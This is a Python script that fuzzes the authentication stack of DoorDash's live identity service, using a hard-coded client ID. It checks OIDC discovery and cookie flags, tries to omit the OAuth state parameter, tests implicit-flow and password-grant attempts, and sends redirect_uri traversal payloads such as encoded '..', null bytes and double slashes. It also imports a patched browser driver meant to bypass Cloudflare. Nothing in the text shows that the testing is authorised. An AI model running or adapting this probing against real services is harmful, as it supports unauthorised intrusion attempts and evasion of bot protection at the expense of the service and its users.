#!/usr/bin/env python3
"""
auth-fuzzer.py — AmrSec's auth techniques applied to DoorDash identity stack.
6 checks, httpx for direct + patched Playwright for CF-bypass.

Checks:
1. JWKS/OIDC discovery     → /.well-known/openid-configuration
2. Cookie flag analysis    → HttpOnly, SameSite, Secure on session cookies
3. OAuth state validation  → Can state be omitted or spoofed?
4. Implicit flow           → response_type=token (deprecated, dangerous)
5. ROPC grant_type         → grant_type=password at /oauth2/connect/token
6. Redirect URI traversal  → Path tricks on registered redirect_uri
"""

import json
import time
import sys
import requests
from urllib.parse import quote
from pathlib import Path

try:
    from playwright_patched import sync_playwright
except ImportError:
    from playwright.sync_api import sync_playwright

OUT = Path("/tmp/doordash/auth-fuzz")
OUT.mkdir(parents=True, exist_ok=True)

IDENTITY = "https://identity.doordash.com"
CLIENT_ID = "1666519390426295040"

# ---------------------------------------------------------------------------
# CHECK 1: JWKS / OIDC Discovery
# ---------------------------------------------------------------------------
def check_jwks_discovery():
    print("\n" + "=" * 50)
    print("[1] JWKS / OIDC Discovery")
    print("=" * 50)

    paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth2/.well-known/openid-configuration",
        "/.well-known/jwks.json",
        "/oauth2/v1/keys",
    ]

    results = {}
    for path in paths:
        url = f"{IDENTITY}{path}"
        try:
            r = requests.get(url, timeout=8, allow_redirects=True)
            results[path] = {
                "status": r.status_code,
                "length": len(r.content),
                "content_type": r.headers.get("content-type", ""),
                "body": r.text[:500],
            }
            icon = "✅" if r.status_code == 200 else "  "
            print(f"  {icon} {path:45s} → {r.status_code} | {len(r.content)}B")
            if r.status_code == 200:
                # Parse JWKS/JSON
                try:
                    data = r.json()
                    if "jwks_uri" in data:
                        print(f"      🔥 jwks_uri: {data['jwks_uri']}")
                    if "authorization_endpoint" in data:
                        print(f"      🔥 auth_endpoint: {data['authorization_endpoint']}")
                    if "token_endpoint" in data:
                        print(f"      🔥 token_endpoint: {data['token_endpoint']}")
                    if "keys" in data:
                        print(f"      🔥 keys: {len(data['keys'])} JWK keys exposed!")
                        for k in data['keys'][:2]:
                            print(f"         kid={k.get('kid','?')} alg={k.get('alg','?')}")
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            results[path] = {"error": str(e)[:120]}
            print(f"  ❌ {path:45s} → {str(e)[:60]}")

    with open(OUT / "1-jwks.json", "w") as f:
        json.dump(results, f, indent=2)
    return results


# ---------------------------------------------------------------------------
# CHECK 2: Cookie Flag Analysis
# ---------------------------------------------------------------------------
def check_cookie_flags():
    print("\n" + "=" * 50)
    print("[2] Cookie Flag Analysis")
    print("=" * 50)

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        # Load signup page to get cookies
        page.goto(f"{IDENTITY}/auth/user/signup", wait_until="domcontentloaded", timeout=20000)
        page.wait_for_timeout(2000)

        cookies = context.cookies()
        findings = []
        for c in cookies:
            # Analyze each cookie
            issues = []
            if not c.get("httpOnly"):
                issues.append("NO_HTTPONLY → XSS can steal via document.cookie")
            if c.get("sameSite", "").lower() == "none" or not c.get("sameSite"):
                issues.append("NO_SAMESITE → CSRF playground")
            if not c.get("secure") and "https" in page.url:
                issues.append("NO_SECURE → transmitted over HTTP")
            if c.get("domain", "").startswith("."):
                issues.append(f"WIDE_DOMAIN → accessible to all subdomains of {c['domain']}")

            risk = "🔥" if issues else "✅"
            print(f"  {risk} {c['name']:30s} domain={c.get('domain','?'):25s} httpOnly={c.get('httpOnly','?')} sameSite={c.get('sameSite','?')} secure={c.get('secure','?')}")
            for issue in issues:
                print(f"      ⚠️  {issue}")

            findings.append({"name": c["name"], "domain": c.get("domain"),
                            "httpOnly": c.get("httpOnly"), "sameSite": c.get("sameSite"),
                            "secure": c.get("secure"), "issues": issues})

        browser.close()

    with open(OUT / "2-cookies.json", "w") as f:
        json.dump(findings, f, indent=2)
    return findings


# ---------------------------------------------------------------------------
# CHECK 3: OAuth State Parameter Validation
# ---------------------------------------------------------------------------
def check_state_validation():
    print("\n" + "=" * 50)
    print("[3] OAuth State Parameter Validation")
    print("=" * 50)

    # Note: state validation happens at the OAuth callback redirect
    # (after signup completes). We can only test whether the signup page
    # renders differently based on state presence — a 200 on signup page
    # does NOT mean state is optional. Real validation testing requires
    # completing the full signup flow through to callback.
    #
    # What we CAN test: does the server 403/400 early if state is bad?

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        tests = [
            ("with-state", f"{IDENTITY}/auth/user/signup?client_id={CLIENT_ID}&redirect_uri=https://www.doordash.com&response_type=code&scope=*&state=abc123xyz"),
            ("no-state", f"{IDENTITY}/auth/user/signup?client_id={CLIENT_ID}&redirect_uri=https://www.doordash.com&response_type=code&scope=*"),
        ]

        results = {}
        for name, url in tests:
            try:
                resp = page.goto(url, wait_until="domcontentloaded", timeout=15000)
                status = resp.status if resp else 0
                title = page.evaluate("() => document.title")
                current_url = page.url

                results[name] = {"status": status, "title": title,
                                "url": current_url[:120]}

                if status >= 400:
                    print(f"  ⚠️  {name:15s} → {status} (rejected)")
                else:
                    print(f"  ⚠️  {name:15s} → {status} (page loads — state validation is at callback, not render)")
            except Exception as e:
                results[name] = {"error": str(e)[:120]}
                print(f"  ❌ {name:15s} → {str(e)[:60]}")

        # Post-analysis
        both_rejected = all(results.get(t, {}).get("status", 0) >= 400 for t in ["with-state", "no-state"])
        if both_rejected:
            print(f"  ⚠️  Both with-state and no-state rejected — cannot distinguish state validation from CF block")
        elif results.get("no-state", {}).get("status", 0) >= 400 and results.get("with-state", {}).get("status", 0) < 400:
            print(f"  🔒 no-state rejected, with-state loads → state IS required")

        browser.close()

    with open(OUT / "3-state.json", "w") as f:
        json.dump(results, f, indent=2)
    return results


# ---------------------------------------------------------------------------
# CHECK 4: Implicit Flow (response_type=token)
# ---------------------------------------------------------------------------
def check_implicit_flow():
    print("\n" + "=" * 50)
    print("[4] Implicit Flow (response_type=token)")
    print("=" * 50)

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        url = f"{IDENTITY}/auth/user/signup?client_id={CLIENT_ID}&redirect_uri=https://www.doordash.com&response_type=token&scope=*&state=test"

        try:
            resp = page.goto(url, wait_until="domcontentloaded", timeout=15000)
            status = resp.status if resp else 0
            final_url = page.url  # Playwright follows redirects, so this is the final page

            # Check the FINAL page URL for access_token in fragment
            has_token = "access_token" in final_url or "#access_token" in final_url

            result = {"status": status, "final_url": final_url[:200], "has_token": has_token}

            if has_token:
                print(f"  🔥 IMPLICIT_FLOW_ALLOWED — access_token in URL!")
                print(f"      URL: {final_url[:150]}")
            elif status >= 400:
                print(f"  ✅ Implicit flow rejected (status={status})")
            else:
                print(f"  ⚠️  Status={status} — check {OUT}/4-implicit.json")
        except Exception as e:
            result = {"error": str(e)[:120]}
            print(f"  ❌ {str(e)[:60]}")

        browser.close()

    with open(OUT / "4-implicit.json", "w") as f:
        json.dump(result, f, indent=2)
    return result


# ---------------------------------------------------------------------------
# CHECK 5: ROPC (grant_type=password)
# ---------------------------------------------------------------------------
def check_ropc():
    print("\n" + "=" * 50)
    print("[5] ROPC — grant_type=password")
    print("=" * 50)

    # Try the mock server endpoint + direct OAuth endpoint
    token_endpoints = [
        f"{IDENTITY}/oauth2/connect/token",
        f"{IDENTITY}/oauth2/token",
        f"{IDENTITY}/auth/token",
    ]

    payloads = [
        {"grant_type": "password", "username": "test@example.com", "password": "test",
         "client_id": CLIENT_ID, "scope": "*"},
        {"grant_type": "password", "username": "test", "password": "",
         "client_id": CLIENT_ID},
    ]

    results = []
    for endpoint in token_endpoints:
        for i, payload in enumerate(payloads):
            try:
                r = requests.post(endpoint, data=payload, timeout=8,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
                result = {"endpoint": endpoint, "payload": payload,
                         "status": r.status_code, "body": r.text[:300]}

                if r.status_code == 200:
                    print(f"  🔥 {endpoint} → 200 OK (ROPC accepted!)")
                    print(f"      Body: {r.text[:200]}")
                elif r.status_code == 400:
                    print(f"  ✅ {endpoint} → 400 Bad Request (ROPC rejected)")
                elif r.status_code == 404:
                    print(f"  → {endpoint} → 404 Not Found")
                else:
                    print(f"  ⚠️  {endpoint} → {r.status_code} | {r.text[:100]}")
                results.append(result)
            except Exception as e:
                results.append({"endpoint": endpoint, "error": str(e)[:120]})
                print(f"  ❌ {endpoint} → {str(e)[:60]}")

    with open(OUT / "5-ropc.json", "w") as f:
        json.dump(results, f, indent=2)
    return results


# ---------------------------------------------------------------------------
# CHECK 6: Redirect URI Path Traversal
# ---------------------------------------------------------------------------
def check_redirect_uri():
    print("\n" + "=" * 50)
    print("[6] Redirect URI Path Traversal")
    print("=" * 50)

    from urllib.parse import quote

    base = "https://www.doordash.com"
    traversal_uris = [
        f"{base}/",                # trailing slash
        f"{base}/..",              # parent dir
        f"{base}/%2e%2e",         # encoded ..
        f"{base}/%2f",             # encoded /
        f"{base}//",               # double slash
        f"{base}/.%00",            # null byte
        f"{base}/.well-known",    # different subpath
        f"{base}/api",            # API subpath
    ]

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        results = []
        for uri in traversal_uris:
            encoded = quote(uri, safe='')
            url = f"{IDENTITY}/auth/user/signup?client_id={CLIENT_ID}&redirect_uri={encoded}&response_type=code&scope=*&state=test"

            try:
                resp = page.goto(url, wait_until="domcontentloaded", timeout=12000)
                status = resp.status if resp else 0
                current_url = page.url

                # Did we get redirected TO the traversal URI? (bad — means it was accepted)
                accepted = uri in current_url

                icon = "🔥" if accepted and status < 400 else "✅" if status >= 400 else "  "
                print(f"  {icon} {uri:45s} → {status} | accepted={accepted}")
                results.append({"uri": uri, "status": status, "accepted": accepted})
            except Exception as e:
                print(f"  ❌ {uri:45s} → {str(e)[:60]}")
                results.append({"uri": uri, "error": str(e)[:120]})

        browser.close()

    with open(OUT / "6-redirect-uri.json", "w") as f:
        json.dump(results, f, indent=2)
    return results


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def main():
    print("🔐 AmrSec Auth Techniques → DoorDash Identity")
    print("=" * 50)

    all_results = {}

    all_results["jwks"] = check_jwks_discovery()
    all_results["cookies"] = check_cookie_flags()
    all_results["state"] = check_state_validation()
    all_results["implicit"] = check_implicit_flow()
    all_results["ropc"] = check_ropc()
    all_results["redirect_uri"] = check_redirect_uri()

    # Final summary
    print("\n" + "=" * 50)
    print("📊 FINAL SUMMARY")
    print("=" * 50)

    # Count 🔥 findings
    fire_count = 0
    with open(OUT / "summary.txt", "w") as f:
        for check_name, data in all_results.items():
            f.write(f"\n[{check_name}]\n")
            if isinstance(data, list):
                for item in data:
                    s = json.dumps(item, default=str)[:200]
                    f.write(f"  {s}\n")
                    if "🔥" in s or "risk" in str(item).lower():
                        fire_count += 1
            else:
                s = json.dumps(data, default=str)[:300]
                f.write(f"  {s}\n")

    print(f"   Results saved to {OUT}/")
    print(f"   🔥 Findings: {fire_count}")
    print(f"   cat {OUT}/summary.txt for full results")


if __name__ == "__main__":
    main()
